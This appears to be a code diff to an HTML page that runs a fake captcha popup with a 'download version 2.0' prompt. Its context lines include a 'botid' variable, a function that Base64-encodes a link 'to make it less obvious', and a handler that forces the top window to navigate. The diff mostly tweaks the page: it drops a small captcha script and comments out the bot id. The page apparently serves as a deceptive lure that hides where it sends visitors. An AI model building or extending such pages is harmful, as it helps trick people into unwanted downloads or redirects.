@@ -1165,21 +1165,7 @@ You may need to download version 2.0 now from the <a rel="noopener noreferrer" h
       </div>
   <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
 
-            <script>
-                var counterC = 0;
-                var alert = false;
-                var counterR = 1;
-                $(document).ready(function(){
-                        function get(){
-                                var url = new URL(document.location.href);
-                        }
-                        get();
-                        $('.capcha__button-next').click(function () { // функция 
-                                get();
-                        capcha();
-                        });
-                });
-        </script>
+
 		
 <script>
 
@@ -1196,7 +1182,7 @@ setTimeout(function(){
       $('.capcha__popup').fadeOut(300);
       $('.capcha__trigger').hide();
       $('.capcha__ok').addClass("capcha__ok_active");
-          var botid = "555";
+        //  var botid = "555";
           setTimeout(function(){
 function check_link() {
     // Base64 encode the link to make it less obvious
@@ -1232,7 +1218,7 @@ setTimeout(function(){
                 </script>
 
 
-  <script>
+<script>
   document.addEventListener('click', function(evt) {
   if (evt.target.matches('a.parent-window-link')) {
     window.top.location = evt.target.href // <-- all magic here
